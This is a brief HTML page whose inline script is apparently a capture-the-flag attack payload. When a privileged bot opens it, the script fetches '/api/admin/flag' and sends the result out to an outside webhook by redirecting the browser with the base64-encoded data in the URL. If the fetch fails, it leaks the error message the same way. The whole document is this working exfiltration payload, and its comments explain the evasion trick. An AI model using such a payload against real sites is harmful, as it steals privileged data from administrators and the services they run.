<!DOCTYPE html>
<html>
<body>
<script>
    async function getTheFlag() {
        const webhook = "https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";
        
        try {
            // 1. Fetch the flag from the most likely endpoint
            const response = await fetch('/api/admin/flag');
            const flag = await response.text();

            // 2. Redirect the bot to your webhook WITH the flag in the URL
            // This is a "Force-Leak" - even if fetch is blocked, a redirect usually works
            window.location.href = webhook + "?flag=" + btoa(flag);
            
        } catch (e) {
            // If the flag fetch fails, let's at least leak the error
            window.location.href = webhook + "?error=" + btoa(e.message);
        }
    }
    getTheFlag();
</script>
</body>
</html>
